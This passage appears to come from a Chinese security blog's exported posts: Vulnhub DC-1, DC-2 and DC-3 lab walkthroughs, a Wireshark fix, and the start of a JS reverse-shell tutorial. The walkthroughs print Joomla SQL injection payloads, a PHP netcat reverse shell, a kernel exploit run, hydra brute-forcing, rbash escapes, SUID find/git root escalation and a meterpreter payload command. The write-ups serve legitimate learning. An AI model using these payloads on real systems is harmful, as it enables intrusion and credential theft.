，来看看作者对他的评价\n\n\n\n```xml\n描述：\n\nDC-3是另一个专门建造的脆弱实验室，旨在获得渗透测试领域的经验。\n\n与之前的DC版本一样，这个版本在设计时考虑了初学者，虽然这一次，只有一个标志，一个入口点，根本没有线索。\nLinux技能和熟悉Linux命令行是必须的，基本渗透测试工具的一些经验也是必须的。\n\n对于初学者来说，谷歌可以提供很大的帮助，但是你总是可以在@ DCAU7上给我发信息以获得帮助，让你再次前行。 但请注意：我不会给你答案，相反，我会告诉你如何前进。\n\n对于那些有CTF和Boot2Root挑战经验的人来说，这可能不会花费你很长时间（实际上，你可能很容易花费不到20分钟）。\n\n如果是这种情况，并且如果您希望它更具挑战性，您可以随时重做挑战并探索获得根并获得旗帜的其他方式\n\n```\n\n\n\n## 靶机环境\n\n首先设置靶机为NAT模式,如果获取不到ip 删除网络适配器重新添加\n\nip地址：\n\n> kali： 192.168.31.225\n>\n> DC-3： 192.168.31.19\n\n## 开始复现\n\n\n\n由于下载的靶机是vbox的使用的，在vmware上出现了一些小问题，所以耽搁了一点时间。\n\n解决方法： vmware打开kali并且vbox打开DC-3 或者都使用vbox去打开\n\n\n\n* 扫描网段\n\n  命令：`nmap -sn 192.168.31.0/24`\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720161450.png)\n\n* 扫描端口\n\n  命令： `nmap -sS 192.168.31.19`\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720161610.png)\n\n* 访问网站\n\n  url: http://192.168.31.19\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720161821.png)\n\n* 指纹获取\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720161925.png)\n\n* 看起来是joomla的cms，使用扫描工具跑一下\n\n  这里使用kali自带的扫描工具\n\n  命令： `joomscan -u http://192.168.31.19`\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720162351.png)\n\n  看来没有什么结果，在搜索的同时 ，我们尝试一些简单的操作，比如弱密码，sql注入，但是看起来情况不容乐观啥都没有，\n\n  扫描结果出来了，看看扫描到了版本信息，后台\n\n  版本信息： `Joomla 3.7.0`\n\n  后台目录： `http://192.168.31.19/administrator/`\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720162744.png)\n\n* 查找相关漏洞\n\n  发现这个版本存在sql注入漏洞\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720163337.png)\n\n  接下来就是复现一下了\n\n*  通过搜索发现可以注入获取到hash密码\n\n  参考链接： https://www.anquanke.com/post/id/86119\n\n  这里先借用工具试试： https://github.com/XiphosResearch/exploits/blob/master/Joomblah/joomblah.py\n\n  复制到本地，然后执行命令:`python joomblah.py http://192.168.31.19`\n\n  获取到user的信息\n\n  `Found user ['629', 'admin', 'admin', 'freddy@norealaddress.net','$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu', '', '']`\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720165327.png)\n\n​\t手工注入\n\n​\t获取hash 或者可以获取session来登录\n\n​\t附上poc 参考链接: https://www.exploit-db.com/exploits/42033\n\n​\tusing sqlmap\n\n```xml\nsqlmap -u \"http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml\" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]\n```\n1获取当前的用户\n\n​\tindex.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x3e,user()),0)\n\n​\t也可以获取最近登录的session 这样也可以登录后台\n\n​\t2 获取版本\n\n​\tindex.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x3e,(version())),0)\n\n​\t`XPATH syntax error: '>5.7.25-0ubuntu0.16.04.2`\n\n​\t3 查数据库\n\n​\tindex.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x3e,(database())),0)\n\n​\t`XPATH syntax error: '>joomladb'`\n\n​\t参考链接\n\n​\thttps://www.jianshu.com/p/76451380b129\n\n​\t4 获取表\n\n​\tindex.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x3a,\t(SELECT(concat(0x3e,TABLE_NAME))FROM(information_schema.tables) where table_schema like \t\tdatabase() LIMIT 1,1),0x3a),1)\n\n​\t但是获取的没有前缀\n\n​\t我们通过16进制去获取到完整的表名，然后在通过转换获取到他的字符串\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720202649.png)\n\n\n\n​\t5 获取列名\n​\tUpdateXML(2,concat(0x3a,(SELECT(concat(COLUMN_NAME))FROM(information_schema.COLUMNS) WHERE TABLE_NAME LIKE 0x6c6d6278635f636f6e74656e7474 LIMIT 0,1),0x3a),1)\n\n* 登录\n\n  破解hash值录`$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu`\n  爆破得到密码： snoopy\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720204736.png)\n\n* 寻找上传点\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720205802.png)\n\n* 反弹shell\n\n  写入代码\n\n  `<?php system(‘rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.1 1337 >/tmp/f’); ?>`\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720210056.png)\n\n* kali 监听 获取shell\n\n  这里切记一定要在同一个网段下，虽然两个网段也能通信但是shell反弹失败\n\n  获取交互模式\n\n  `python 'import pty;pty.spawn(\"/bin/bash\")'`\n\n  注意： 如果交互模式不成功，就换个文件名或者换个路径重新反弹交互shell\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720213055.png)\n\n\n* 获取信息\n\n  获取版本信息\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720213332.png)\n\n* 搜索相关系统漏洞尝试提权\n\n  参考： https://www.exploit-db.com/\n\n  然后我参照大佬的选用了本地拒绝服务漏洞提权\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720214214.png)\n\n  如果要复现漏洞需要检查版本，用户权限\n\n  将提权下载到本地，编译后，使用wget下载，这个下载了好久才下载好\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720235102.png)\n\n\n  之后就是按步骤走了\n\n  下载两个文件\n  ```xml\n  tar xf exploit.tar  \n  cd ebpf_mapfd_doubleput_exploit  \n  ./compile.sh  \n  ./doubleput  \n  ```\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720235919.png)\n\n\n\n* 提权成功\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190721000019.png)\n\n* 获取flag\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190721000242.png)\n\n\n\n## 结束语\n\n​\t这次花费了大量的时间调试，对于各种问题的解决方式有待提高，今日份的靶机奉上，本靶机只适合学习不要将其中的技术用于其他途径。\n","tags":["joomla cms 注入","ubuntu 16.04 bpf 提权"],"categories":["靶机"]},{"title":"Vulnhub DC-2","url":"/2019/10/04/靶机/Vulnhub DC-2/","content":"\n# 前言\n\n关于Vulnhub  以及DC，以及如何使用ova安装，我已经在DC-1中介绍了 ，今天带来第二弹，比第一弹难度稍微大一点，重点还是考察工具的使用和命令的熟练程度\n附上链接[Vulnhub DC Challenges之 DC-1](https://blog.csdn.net/wang_624/article/details/90509951)\n## DC-2介绍\nDC-2，我们主要是从web入手渗透拿到flag，需要大家对信息收集要有一定的了解，需要掌握的工具:nmap,hydra,cewl。\n### 靶机环境\nDC-2:192.168.248.154\nubuntu:192.168.248.149\n\n## 前期配置\n\n这里作者提示我们需要设置hosts才能访问web服务。\n提供linux和windows设置方式\nLinux\n\t`vim  /etc/hosts`\n添加 `靶机ip DC-2`\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190526004434224.png)Windows\n`C:\\Windows\\System32\\drivers\\etc\\hosts`\n添加  `靶机ip DC-2`\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190526004644262.png)\n## 开始拿flag\n扫描网段\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190526004741929.png)\n扫描端口\n这里我只扫描了常用的端口，只有80端口啊，看来这是一次web提权之路。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190526004847309.png)如果之前没有设置hosts ，这里访问就会失败。设置之后，接下来就可以正常去访问DC-2的web服务了。查看下网站的指纹信息，\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190526005047396.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)尝试直接去msf利用WordPress 去提权，发现需要admin的密码，作废\n## flag1\n查看页面信息，发现了flag1\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190526005155922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)tip：登录去找到下一个flag，可能需要账号和密码，这里提示你使用cewl工具，密码藏在页面里\n先去看看页面都有什么，看看有没有登录的地方，尝试去试探login.php,admin.php,等等类似后台或者登录的页面，发现都会导向一个搜索页面\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190526005358967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)随便搜索点东西，发现flag1\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190526005422453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)额，发现flag1 ，什么鬼，发现右下边的都可以点，试着点点看看有什么东西没，发现登录点，这是大收获啊。发现后台\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190526005500558.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)\n## flag2\n返回刚才的搜索页面继续去收集信息，flag2 也出来了，又是提示啊，看来这里有两个方法啊，\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190526005530928.png)接下来我们尝试利用cewl 生成密码字典\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190526005618577.png)然后有了密码， 没有用户名，找到了一款针对于wordpress的安全扫描软件\n\n简要介绍一下，\nWPScan是一款针对wwordpress的安全扫描软件；WPScan可以扫描出wordpress的版本，主题，插件，后台用户以及爆破后台用户密码等（但是我的kali的工具一直要更新，如果大家有这个工具可以尝试一下）\n\n那么尝试利用burp去爆破通过对返回长度不同判断是否有当前用户，这里通过我强大的字典，跑出来了三个用户名:admin,jerry和tom\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190526005842814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)之后使用hydra去爆破wordpress后台，然后分别设置用户字典和密码字典，我们去爆破\n提供两个爆破思路\n使用hydra\n```xml\nhydra -L user.txt  -P dc2.txt dc-2 http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190526010020733.png)使用burp去爆破，截取数据包，然后`Ctrl+l`之后根据下图修改\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190526010102130.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)选择你的payload，分别导入用户字典和密码字典，\n我的burp是专业版，可以跑多线程，设置多线程之后，可以很快的跑出来，线程加高，几秒跑出来了\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190526010312990.png)登录后台\n|  username|  password |\n|:--------:|-------  |\n|  tom | parturient|\n| jerry |adipiscing  |\n这两个密码登录成功\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190526010608665.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)既然拿到了密码， 我们尝试去使用密码去尝试去反弹shell，创建失败，需要更高的权限\n\n## flag3\n这里就不知道怎么去弄了，重新查看之前收集的数据，扫描全端口，发现了新的端口\nnmap -p- -sV 192.168.248.154\n发现了ssh端口，尝试我们得到的用户去登录\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190526010638857.png)使用tom用户直接登录成功\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190526010700380.png)发现-rbash 命令没有找到\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190526010714658.png)\n查找绕过方法\n```xml\nBASH_CMDS[a]=/bin/sh;a\n$ /bin/bash\nbash: groups: command not found\ntom@DC-2:~$  export PATH=$PATH:/bin/\ntom@DC-2:~$  export PATH=$PATH:/usr/bin\n```\n参考链接：https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190526010834281.png)\n查看flag3\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190526010851201.png)\n## flag4\n查看passwd，发现jerry用户\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2019052601090790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)尝试切换到jerry （这里我尝试直接登录jerry 显示权限被拒绝）\n切换登录成功\n\n查看目录发现flag4\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190526010949944.png)\n##  最终flag\nsudo 查看 发现可以使用git命令，并且是可以是root权限不需要密码\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190526011019444.png)继续百度，搜索git提权\n命令：\n```xml\ngit -p help\n!/bin/sh\n```\n参考链接\nhttps://gtfobins.github.io/gtfobins/git/#limited-suid\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190526011129561.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)查看/root\n拿到最后的flag\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190526011142208.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)\n## 总结\n1. 前台爆破，需要社工到用户名和密码\n2. -rbash 绕过\n3. git 提权\n\n---\n永远不要停下学习的脚步\n","tags":["git提权"],"categories":["靶机"]},{"title":"Vulnhub之DC-1 find 提权骚思路","url":"/2019/10/04/靶机/Vulnhub DC-1/","content":"\nDC-1 学习\n\n<!-- more -->\n\n# Vulnhub简介\n\nVulnhub是一个提供各种漏洞环境的靶场平台，供安全爱好者学习渗透使用，大部分环境是做好的虚拟机镜像文件，镜像预先设计了多种漏洞，需要使用VMware或者VirtualBox运行。每个镜像会有破解的目标，大多是Boot2root，从启动虚机到获取操作系统的root权限和查看flag。\n网址：<https://www.vulnhub.com>\n\n## DC 系列\nDC总共有6个靶机，本次我们使用的靶机是DC-1 ，难度不大，适合新手去实验和入门，\n下载地址:  <http://www.five86.com/dc-1.html>\n\n## DC-1 介绍\nDC-1 没有烧脑的难度，重点是需要我们去掌握一些常用的渗透工具，比如nmap，hydra，msf等等。\n作者说flag在root目录下，那么我们最终的任务就是去提权或者获取到有root权限去执行命令。\n初次接触可能需要去百度相关的知识，所以努力的你肯定会有所进步，\n\n# 简要说明一下安装\n1. 下载好之后解压，然后使用vmware打开ova文件。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190523224514645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)2. 之后可能会提示报错，不用管忽略。由于是桥接网络，所以我们需要设置一下，我选择的是NAT\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190523224758585.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)准备就绪，可以开始了！！\n\n# 开始拿flag喽，激动不\n## 介绍下环境\n```xml\n网段：192.168.248.0/24\n主机：192.168.248.149\n靶机：192.168.248.152\n```\n这里大家需要注意一下，因为我是用的ubuntu，所以有的命令需要加sudo，如果大家用的是kali就不需要了\n## 扫描网段\n\n命令：`nmap -sn 192.168.248.0/24`\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190523225316403.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)\n## 扫描主机\n命令：`nmap -sS 192.168.248.152 `\n\n-sS ：半开放扫描（非3次握手的tcp扫描）比较安全，不会产生会话，几乎不会产生日志，工作中常用，建议大家不要直接全上的去扫，稳妥更稳妥，需要有root权限\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190523225645455.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)\n## 收集信息，查看目标主页\n我这里尝试了弱密码，好像没啥用，看到了网站的管理系统，尝试查找相关漏洞攻击\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190523225754230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)\n## 使用Metasploit查找漏洞获取shell\n```xml\nwxy@wxy-virtual-machine:~$ msfconsole -q\nmsf5 > search drupal\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190523225943748.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)选择最新最有效的的去尝试\n\n```xml\nmsf5 > use exploit/unix/webapp/drupal_drupalgeddon2\n```\n查看选项，设置相关参数\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190523231122428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)设置rhosts\n```xml\nmsf5 exploit(unix/webapp/drupal_drupalgeddon2) > set rhosts 192.168.248.152\n```\n执行\n```xml\nmsf5 exploit(unix/webapp/drupal_drupalgeddon2) > exploit\n```\n\n成功获取shell\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190523232130797.png)获取交互式shell\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190523232203708.png)\n## 收集信息\n```xml\nwww-data@DC-1:/var/www$ ls\n发现flag1 文件\n```\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190523232358393.png)搜索flag文件，\n```xml\nwww-data@DC-1:/var/www$ find / -name  flag\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190523232823474.png)查看passwd文件\n```xml\nwww-data@DC-1:/var/www$ cat /etc/passwd\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190523232626814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)发现特别的用户，尝试去查看用户的目录\n找到了一个flag4.txt,这里是作者迷惑你的一个flag，\n```xml\nwww-data@DC-1:/var/www$ cd /home\nwww-data@DC-1:/home$ ls\nflag4\nwww-data@DC-1:/home$ cd /www-data@DC-1:/home/flag4$ ls\nflag4.txt\nwww-data@DC-1:/home/flag4$ cat flag4.txt\nCan you use this same method to find or access the flag in root?\n\nProbably. But perhaps it's not that easy.  Or maybe it is?\n```\n## 提权\n既然我们在普通用户下没有找到flag，我们只能去提权了\n\n查看shadow文件,发现权限不足\n```xml\nwww-data@DC-1:/var/www$ cat /etc/shadow\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190523233645786.png)\n查找系统中具有suid设置的所有文件\n```xml\nwww-data@DC-1:/var/www$ find / -perm -4000 2>/dev/null\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190523234336213.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)这里去查看了下大佬的骚思路，找到了find提权方式,成功拿到shell\n说明提权方式,为什么我们会想到用find提权，作者在flag3也告诉了我们，所以如果大家要一步一步的走，请移步后面flag到flag3查找过程\n利用find的权限，使用exec去执行一些root权限的命令。\n```xml\nwww-data@DC-1:/var/www$ touch wxy\nwww-data@DC-1:/var/www$ find / -name wxy -exec \"whoami\" \\;\nwww-data@DC-1:/var/www$ find / -name -exec \"/bin/sh\" \\;\n# ls\n# cd /root\n# ls\n# cat thefinalflag.txt\nWell done!!!!\n\nHopefully you've enjoyed this and learned some new skills.\n\nYou can let me know what you thought of this little journey\nby contacting me via Twitter - @DCAU7\n\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190523234628328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70) 提权成功，但是我们怎么能满足于只拿到flag，接下来，就是寻找flag之旅\n\n## flag1\n这个比较好找，我直接ls了当前的目录就发现了\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190523235318529.png)查看flag1.txt\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190523235359943.png)\n\n## flag2\n那么我们就去查看cms配置文件,顺便收获flag2\n发现sites文件，逐步进入查看发现settings.php\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190523235801197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)\n查看settings.php,获取到了flag2 和数据库密码\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190523235920686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)登录数据库\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190524000305209.png)查看当前数据库\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190524000353118.png)\n查看表drupaldb\n`show tables from drupaldb;`\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190524000703263.png)\n查看users表中的信息，发现两个用户\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190524001240308.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)搜索drupal的加密方式，尝试破解或者置换密码\n参考链接：<http://drupalchina.cn/node/2128>\n```xml\nwww-data@DC-1:/var/www$ php scripts/password-hash.sh admin   \nphp scripts/password-hash.sh admin\n\npassword: admin \t\thash: $S$DVoemoxFFm9/7b0MuI7NDlBLlzty2pkOYF8Noj/IkodVTd9u84qV\n\n```\n复制 加密的密码，去数据库修改\n\n```xml\nmysql> update users set pass =\"$S$DVoemoxFFm9/7b0MuI7NDlBLlzty2pkOYF8Noj/IkodVTd9u84qV\" where name=\"admin\";\n```\n\n##  flag3\n去网站登录\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190524002525352.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)发现flag3\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190524002558428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)根据这个提示，在结合上面find具有suid的权限，我们去搜索提权可以获取到使用find提权去执行root权限，最后拿到最终flag。\n## flag4\n这个在flag4用户目录下,我们切换到flag4目录下`cd /home/flag4`\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190524065908178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)这里还有一种做法，\n我们刚开始如果发现了flag4 用户，可以尝试去爆破，我们推荐hydra这个神器，如果你没有爆破字典，可以把john的拿过来用\n```xml\nwxy@wxy-virtual-machine:~$ hydra -l flag4 -P /home/wxy/Desktop/password_dict/Weak_password.txt ssh://192.168.248.152\n\n```\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190524070708516.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)\n爆破成功后，我们尝试登录拿到flag4\n```xml\nwxy@wxy-virtual-machine:~$ ssh flag4@192.168.248.152\nflag4@DC-1:~$ ls\nflag4@DC-1:~$ cat flag4.txt\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190524070854357.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)\n## 最终flag\n我们已经知道了find的特殊之处，使用find去获取shadow文件。\n```xml\nwww-data@DC-1:/var/www$ find / -name wxy -exec \"/bin/sh\" \\;\n# cat /etc/shadow\n或者\nwww-data@DC-1:/etc$ find /etc/shadow -exec cat {} \\;    \n```\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190524072046561.png)![在这里插入图片描述](https://img-blog.csdnimg.cn/20190524072409895.png)我们尝试去解密，linux对密码是sha256的加密方式\n\n如果密码比较复杂，解密是费时有可能解不出来，我们查看对shadow的权限\n发现root对其具有写权限，这里我们备份一份shadow，然后直接改里面的值，去登录\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190524073726571.png)\nps：这里想了几种办法都没用，大佬有更加骚的姿势，欢迎指点\n\n# 总结\n重点是find提权\n下来就是各种工具的熟练掌握\n\n---\n永远不要停下你的步伐\n","tags":["Suid 提权"],"categories":["靶机"]},{"title":"解决wireshark没有捕获端口的问题","url":"/2019/10/04/实用技巧/解决wireshark没有捕获端口的问题/","content":"流量捕获时发现没有端口解决方法\n\n<!-- more -->\n\n# 解决\n\n今天打开wireshark发现没有捕获的接口，然后查了下需要开启npf\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/12/20190712125750.png)\n\n1 以管理员模式启动cmd\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/12/20190712125903.png)\n\n2 输入命令 `net start npf`\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/12/20190712125750.png)\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/12/20190712130050.png)\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/12/20190712130142.png)\n\n---\n希望可以帮助到各位小伙伴\n","tags":["wireshark"],"categories":["实用技巧"]},{"title":"利用js文件反弹shell","url":"/2019/10/04/web安全/shell/利用js文件反弹shell/","content":"\n\n\n# 前言\n\n本篇文章是按照大佬的文章复现\n本文只用于测试，请不要将其用于非法途径\n公众号： 洛米唯熊\n\n# 环境\n* 攻击： kali\n\t\tip: 192.168.248.132\n* 测试： windows 7 x64\n\t\tip: 192.168.248.136\n# 工具地址\nhttps://github.com/CroweCybersecurity/ps1encode\n# 克隆\n在kali克隆工具\n命令：`git clone https://github.com/CroweCybersecurity/ps1encode.git`\n\n# 生成js脚本\n命令：`./pslencode.rb --LHOST 192.168.248.132 --LPORT 4444 --PAYLOAD windows/meterpreter/reverse_tcp --ENCODE cmd -t js`\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E7%94%9F%E6%88%90js%E8%84%9A%E6%9C%AC2.png)\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E7%94%9F%E6%88%90.png)\n\n>  复制文本放到文件中生成1.js文件\n\n# 